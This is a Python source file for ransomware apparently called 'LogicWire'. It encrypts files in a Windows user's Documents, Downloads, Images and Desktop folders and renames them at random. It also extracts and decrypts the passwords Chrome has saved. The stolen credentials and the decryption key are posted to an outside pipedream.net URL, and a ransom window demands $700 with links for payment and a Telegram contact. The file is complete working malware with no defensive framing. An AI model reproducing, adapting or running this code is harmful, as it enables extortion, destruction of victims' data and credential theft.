from cryptography.fernet import Fernet
from tkinter import *
import webbrowser
from pathlib import Path
import codecs
import os
import glob
import random
import string
import requests
import urllib.request
import tempfile
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta

def main():
    new = 1
    btcurl = "https://buy.moonpay.io"
    tgmurl = "https://t.me/z01youl"
    window = Tk()
    url = 'https://icon-icons.com/downloadimage.php?id=76799&root=1061/ICO/512/&file=pirate_icon-icons.com_76799.ico'
    urllib.request.urlretrieve(url, 'ico.ico')
    window.wm_iconbitmap('ico.ico')
    window.title("LogicWire")
    window.geometry('1100x700')
    window.configure(bg='black')
    lbl = Label(window, text="LogicWire", font=("Arial Bold", 50), foreground="red", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    lbl = Label(window, text="", font=("Arial Bold", 20), foreground="red", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    message = """
    All your files have been encrypted due to a security problem with your PC. 
    We also recovered all your online accounts.
    If you want to restore them, write us to our Telegram profil by clicking on the "Contact" button.
    Then i will show you how to pay the amount of 700$.
    """
    lbl = Label(window, text=message, font=("Arial Bold", 10), foreground="white", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    message2 = """
        Attention
    
        Do not rename encrypted files.
        Do not try to decrypt your data using third party software, it may cause permanent data loss.
        Decryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can become a victim of a scam.
        """
    attention = Label(window, text=message2, font=("Arial Bold", 10), foreground="white", background="red")
    attention.config(anchor=CENTER)
    attention.pack()
    lbl2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    lbl2.config(anchor=CENTER)
    lbl2.pack()
    ln = Label(text="", bg="black")
    ln.config(anchor=CENTER)
    ln.pack()
    lbl3 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    lbl3.config(anchor=CENTER)
    lbl3.pack()

    def btcaddress():
        webbrowser.open(btcurl, new=new)
    def telegramtag():
        webbrowser.open(tgmurl, new=new)

    btn = Button(window, text="Pay", command=btcaddress)
    btn.config(anchor=CENTER)
    btn.pack()
    ln2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    ln2.config(anchor=CENTER)
    ln2.pack()
    btn2 = Button(window, text="Contact", command=telegramtag)
    btn2.config(anchor=CENTER)
    btn2.pack()
    window.mainloop()

def write_key():
    """
    Générer la clé
    """
    keydecrypt = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(keydecrypt)

    with open("key.key", "rb") as key_file:
        key = key_file.read()
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            if username or password:
                logs = f"""
🤖 Origin URL: {origin_url}
🤖 Action URL: {action_url}
💥 Username: {username}
💥 Password: {password}
                            """
                with codecs.open("logs.txt", "a+", encoding="utf-8") as log_file:
                    log_file.write(str(logs))
            else:
                continue

        rez = open("logs.txt", "r", encoding="utf-8").read()
        r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass

def load_key():
    """
    Charge la clé
    """
    return open("key.key", "rb").read()

def kill_key():
    os.remove("key.key")

def start():
    tmp = str(tempfile.gettempdir())
    signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
    path = os.path.dirname(os.path.abspath(signature))
    tmp_files = []
    for root, dirs, files in os.walk(tmp):
        for file in files:
            tmp_files.append(file)
    if signature in tmp_files:
        main()
    else:
        file = open("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp", "w").write("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5")
        shutil.move(path + "\\" + signature, tmp + "\\" + signature)
        write_key()
        key = load_key()
        documents = str(os.path.join(Path.home(), "Documents"))
        downloads = str(os.path.join(Path.home(), "Downloads"))
        images = str(os.path.join(Path.home(), "Images"))
        desktop = str(os.path.join(Path.home(), "Desktop"))
        dirs = []
        dirs.append(documents)
        dirs.append(downloads)
        dirs.append(images)
        dirs.append(desktop)
        for dir in dirs:
            encrypt(dir, key)
        kill_key()
        main()

def encrypt(dir, key):
    f = Fernet(key)
    subdirs = [x[0] for x in os.walk(dir)]
    for dirdir in subdirs:
        for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
            with open(filename, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(filename, "wb") as new:
                new.write(encrypted_data)

            extension = str(filename).split(".")[1]
            name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
            os.rename(filename, dirdir + "/" + name + "." + extension)

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

start()
